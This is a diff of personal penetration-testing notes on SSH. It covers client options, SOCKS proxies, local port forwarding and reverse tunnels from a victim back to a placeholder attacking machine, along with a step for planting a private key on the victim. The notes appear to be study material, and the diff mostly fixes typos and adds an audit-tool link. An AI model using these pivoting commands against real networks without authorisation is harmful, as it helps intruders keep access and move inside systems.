@@ -128,6 +128,7 @@
   - declares SSH key type that client uses
 - -o PasswordAuthentication=no
   - no password
+- -o PreferredAuthentications=password|publickey,
 - In the command: ~C = to execute ssh commands
 [Port Forwarding](https://notes.benheater.com/books/network-pivoting)
 
@@ -153,7 +154,6 @@ Match junkuser
   - ssh -D PORT user@[public_ip] -fN
   - Proxy: SOCKS5 + PORT
 
-
 - create key pair on the attacking machine
 - transfer private key to victim
 - stablish connection from victim to attacking
@@ -161,7 +161,7 @@ Match junkuser
   - Browser: localhost
   - executing on we habe the shell
 
-- -L ==> Port FOrwarding
+- -L ==> Port Forwarding
   - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
   - access FIRST through SECOND, 8000 is local port
     - -f = background
@@ -176,6 +176,9 @@ Match junkuser
   - transfer private key to target: 
   - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
   - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN
+
+- Tools
+  - [ssh-audit.py](https://github.com/jtesta/ssh-audit)
 
 ### SS
 - tool to investigate sockets
